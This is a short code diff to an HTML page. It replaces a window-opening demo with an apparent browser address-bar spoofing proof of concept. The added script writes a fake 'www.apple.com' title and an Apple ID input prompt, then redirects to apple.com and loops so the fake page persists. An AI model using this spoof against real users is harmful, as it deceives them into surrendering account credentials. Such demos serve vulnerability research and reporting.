@@ -1,9 +1,22 @@
+<script>
+function spoof()
 
-<body>
-  <script>
-function go() {
-  var x = window.open('http://www.google.com');
-  setTimeout(function(){x.location = "http://bin.org/delay/10"}, 3000);
-};
+{
+
+document.write("<title>www.apple.com</title>");
+  
+    a= '<h1>Fake Content!!</h1><p>Please input your Apple ID here:<input></p>'
+
+document.write(a);
+window.location.assign("http://www.apple.com:1121");
+
+   	setTimeout(function(){
+		spoof();  // Loop makes the browser always shows the fake page.
+	}, 2000);
+
+}
+
+
+
+setInterval(spoof(),2000);
 </script>
-<input onclick="go()" value="Click here" type="button" /></body>
